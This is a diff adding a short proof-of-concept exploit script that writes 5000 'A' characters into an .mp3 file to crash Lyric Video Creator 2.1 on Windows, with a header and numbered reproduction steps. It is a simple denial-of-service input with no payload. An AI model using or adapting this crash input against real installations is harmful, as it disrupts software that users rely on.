@@ -1,0 +1,19 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: Lyric Video Creator 2.1 - '.mp3' Denial of Service (PoC)
+# Date: 08/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://lyricvideocreator.com/
+# Software Link: https://lyricvideocreator.com/dwl/LyricVideoCreator.exe
+# Version: 2.1
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "LyricVideo.py", it will create a new file "sample.mp3"
+# 2.- Open LyricVideoCreator.exe
+# 4.- Click on the 'Browse song' button, select the 'sample.mp3' file created and click on the 'Open' button
+# 5.- Crashed
+
+buffer = "\x41" * 5000
+f = open ("sample.mp3", "w")
+f.write(buffer)
+f.close()
